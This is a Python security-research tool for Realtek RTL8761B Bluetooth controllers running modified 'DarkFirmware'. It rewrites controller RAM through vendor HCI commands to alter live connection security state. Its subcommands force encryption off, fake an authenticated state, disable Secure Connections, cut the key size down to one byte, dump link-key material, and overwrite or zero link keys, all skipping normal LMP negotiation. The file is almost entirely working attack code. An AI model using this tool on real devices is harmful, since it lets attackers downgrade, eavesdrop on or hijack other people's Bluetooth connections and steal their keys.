#!/usr/bin/env python3
"""Connection State Manipulator — directly modify controller security state via RAM writes.

Manipulates encryption, authentication, and key state in the RTL8761B
connection table without going through the normal LMP negotiation path.

Usage:
    sudo python3 conn_state_manipulator.py status [--conn N]
    sudo python3 conn_state_manipulator.py force-enc-off [--conn N]
    sudo python3 conn_state_manipulator.py force-enc-on [--conn N]
    sudo python3 conn_state_manipulator.py force-auth [--conn N]
    sudo python3 conn_state_manipulator.py clear-sc [--conn N]
    sudo python3 conn_state_manipulator.py set-keysize N [--conn N]
    sudo python3 conn_state_manipulator.py write-key HEXKEY [--conn N]
    sudo python3 conn_state_manipulator.py zero-key [--conn N]

WARNING: These operations modify controller state directly. They may cause
crashes, disconnects, or undefined behavior. For security research only.

Requires: DarkFirmware loaded, same USB session as Patch Writer.
"""

import sys
import os
import struct
import argparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import usbbluetooth
from darkfirmware_utils import find_realtek_device as _find_device
from scapy_usbbluetooth import UsbBluetoothSocket
from scapy.packet import Packet, bind_layers
from scapy.fields import ByteField, XLEIntField, XStrLenField
from scapy.layers.bluetooth import HCI_Hdr, HCI_Command_Hdr, HCI_Event_Command_Complete

BOS_BASE = 0x8012DC50
SLOT_SIZE = 0x2B8  # 696 bytes (from RE)
SEC_PTR_OFFSET = 0x58

# Secondary struct offsets (from decompiled RE)
OFF_KEY_SIZE = 0x23
OFF_ENC_ENABLED = 0x26
OFF_AUTH_STATE = 0x50
OFF_KEY_MATERIAL_COPY = 0x51  # 16 bytes — link key material
OFF_SC_FLAG = 0x214

class HCI_Cmd_VSC_Realtek_Read_Mem(Packet):
    name = "Realtek Read Memory"
    fields_desc = [ByteField("size", 0x20), XLEIntField("address", 0x80000000)]
class HCI_Cmd_VSC_Realtek_Write_Mem(Packet):
    name = "Realtek Write Memory"
    fields_desc = [ByteField("size", 0x20), XLEIntField("address", 0x80000000),
                   XLEIntField("data_to_write", 0x33221100)]
class HCI_Cmd_Complete_VSC(Packet):
    name = 'VSC complete'
    fields_desc = [XStrLenField("data", 0, length_from=lambda pkt: pkt.underlayer.underlayer.len)]

bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Read_Mem, ogf=0x3f, ocf=0x0061)
bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Write_Mem, ogf=0x3f, ocf=0x0062)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfc61)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfc62)


def find_device():
    return _find_device()


def read4(sock, addr):
    pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_VSC_Realtek_Read_Mem(address=addr)
    try:
        resp = sock.sr1(pkt, verbose=0, timeout=2)
        if HCI_Event_Command_Complete in resp and resp[HCI_Event_Command_Complete].status == 0:
            data = resp.data
            return bytes(data[:4]) if isinstance(data, (bytes, bytearray)) else data.to_bytes(4, 'little')
    except Exception:
        pass
    return None


def write4(sock, addr, val):
    pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_VSC_Realtek_Write_Mem(address=addr, data_to_write=val)
    resp = sock.sr1(pkt, verbose=0)
    return HCI_Event_Command_Complete in resp and resp[HCI_Event_Command_Complete].status == 0


def read_byte(sock, addr):
    data = read4(sock, addr & ~3)
    if data:
        return data[addr & 3]
    return None


def write_byte(sock, addr, val):
    """Write a single byte by reading 4 bytes, modifying one, writing back."""
    aligned = addr & ~3
    data = read4(sock, aligned)
    if not data:
        return False
    word = struct.unpack('<I', data)[0]
    shift = (addr & 3) * 8
    mask = ~(0xFF << shift)
    new_word = (word & mask) | ((val & 0xFF) << shift)
    return write4(sock, aligned, new_word)


def get_secondary_ptr(sock, conn):
    bos_addr = BOS_BASE + (conn * SLOT_SIZE)
    ptr_data = read4(sock, bos_addr + SEC_PTR_OFFSET)
    if not ptr_data:
        return None
    sec_ptr = struct.unpack('<I', ptr_data)[0]
    if sec_ptr < 0x80000000 or sec_ptr > 0x80140000:
        return None
    return sec_ptr


def cmd_status(sock, conn):
    sec = get_secondary_ptr(sock, conn)
    if not sec:
        print(f"[!] No valid connection at slot {conn}")
        return

    print(f"[*] Connection slot {conn}, secondary struct at 0x{sec:08X}")
    fields = [
        ("enc_enabled", OFF_ENC_ENABLED),
        ("key_size", OFF_KEY_SIZE),
        ("auth_state", OFF_AUTH_STATE),
        ("sc_flag", OFF_SC_FLAG),
    ]
    for name, off in fields:
        val = read_byte(sock, sec + off)
        print(f"  {name:20s} (+0x{off:04X}): 0x{val:02X} ({val})" if val is not None else f"  {name}: READ FAILED")

    # Read key material
    print(f"  key_material_copy (+0x{OFF_KEY_MATERIAL_COPY:04X}):")
    for off in range(0, 16, 4):
        data = read4(sock, sec + OFF_KEY_MATERIAL_COPY + off)
        if data:
            print(f"    +0x{OFF_KEY_MATERIAL_COPY+off:04X}: {data.hex()}")


def cmd_force_enc(sock, conn, enable):
    sec = get_secondary_ptr(sock, conn)
    if not sec:
        print(f"[!] No valid connection at slot {conn}")
        return
    val = 1 if enable else 0
    old = read_byte(sock, sec + OFF_ENC_ENABLED)
    if write_byte(sock, sec + OFF_ENC_ENABLED, val):
        new = read_byte(sock, sec + OFF_ENC_ENABLED)
        print(f"[+] enc_enabled: {old} → {new}")
    else:
        print("[!] Write failed")


def cmd_force_auth(sock, conn):
    sec = get_secondary_ptr(sock, conn)
    if not sec:
        print(f"[!] No valid connection at slot {conn}")
        return
    # Set auth_state to 4 (authenticated) — value seen in RE for completed auth
    old = read_byte(sock, sec + OFF_AUTH_STATE)
    if write_byte(sock, sec + OFF_AUTH_STATE, 0x04):
        new = read_byte(sock, sec + OFF_AUTH_STATE)
        print(f"[+] auth_state: 0x{old:02X} → 0x{new:02X} (forced authenticated)")
    else:
        print("[!] Write failed")


def cmd_clear_sc(sock, conn):
    sec = get_secondary_ptr(sock, conn)
    if not sec:
        print(f"[!] No valid connection at slot {conn}")
        return
    old = read_byte(sock, sec + OFF_SC_FLAG)
    if write_byte(sock, sec + OFF_SC_FLAG, 0x00):
        new = read_byte(sock, sec + OFF_SC_FLAG)
        print(f"[+] sc_flag: 0x{old:02X} → 0x{new:02X} (SC disabled)")
    else:
        print("[!] Write failed")


def cmd_set_keysize(sock, conn, size):
    sec = get_secondary_ptr(sock, conn)
    if not sec:
        print(f"[!] No valid connection at slot {conn}")
        return
    if size < 1 or size > 16:
        print(f"[!] Key size must be 1-16, got {size}")
        return
    old = read_byte(sock, sec + OFF_KEY_SIZE)
    if write_byte(sock, sec + OFF_KEY_SIZE, size):
        new = read_byte(sock, sec + OFF_KEY_SIZE)
        print(f"[+] key_size: {old} → {new}")
    else:
        print("[!] Write failed")


def cmd_write_key(sock, conn, hex_key):
    sec = get_secondary_ptr(sock, conn)
    if not sec:
        print(f"[!] No valid connection at slot {conn}")
        return
    key_bytes = bytes.fromhex(hex_key)
    if len(key_bytes) != 16:
        print(f"[!] Key must be 16 bytes (32 hex chars), got {len(key_bytes)}")
        return
    print(f"[*] Writing key to +0x{OFF_KEY_MATERIAL_COPY:04X}...")
    for off in range(0, 16, 4):
        word = struct.unpack_from('<I', key_bytes, off)[0]
        addr = sec + OFF_KEY_MATERIAL_COPY + off
        write4(sock, addr, word)
    # Verify
    for off in range(0, 16, 4):
        data = read4(sock, sec + OFF_KEY_MATERIAL_COPY + off)
        print(f"  +0x{OFF_KEY_MATERIAL_COPY+off:04X}: {data.hex()}" if data else "  VERIFY FAILED")
    print("[+] Key written")


def cmd_zero_key(sock, conn):
    cmd_write_key(sock, conn, "00" * 16)


def main():
    parser = argparse.ArgumentParser(description="Connection State Manipulator")
    parser.add_argument("command", choices=["status", "force-enc-off", "force-enc-on",
                        "force-auth", "clear-sc", "set-keysize", "write-key", "zero-key"])
    parser.add_argument("args", nargs="*")
    parser.add_argument("--conn", type=int, default=0)
    args = parser.parse_args()

    ctrl = find_device()
    if not ctrl:
        print("[!] No device found")
        sys.exit(1)
    sock = UsbBluetoothSocket(ctrl)

    if args.command == "status":
        cmd_status(sock, args.conn)
    elif args.command == "force-enc-off":
        cmd_force_enc(sock, args.conn, False)
    elif args.command == "force-enc-on":
        cmd_force_enc(sock, args.conn, True)
    elif args.command == "force-auth":
        cmd_force_auth(sock, args.conn)
    elif args.command == "clear-sc":
        cmd_clear_sc(sock, args.conn)
    elif args.command == "set-keysize":
        if not args.args:
            print("[!] Usage: set-keysize N")
            sys.exit(1)
        cmd_set_keysize(sock, args.conn, int(args.args[0]))
    elif args.command == "write-key":
        if not args.args:
            print("[!] Usage: write-key HEXKEY (32 hex chars)")
            sys.exit(1)
        cmd_write_key(sock, args.conn, args.args[0])
    elif args.command == "zero-key":
        cmd_zero_key(sock, args.conn)


if __name__ == "__main__":
    main()
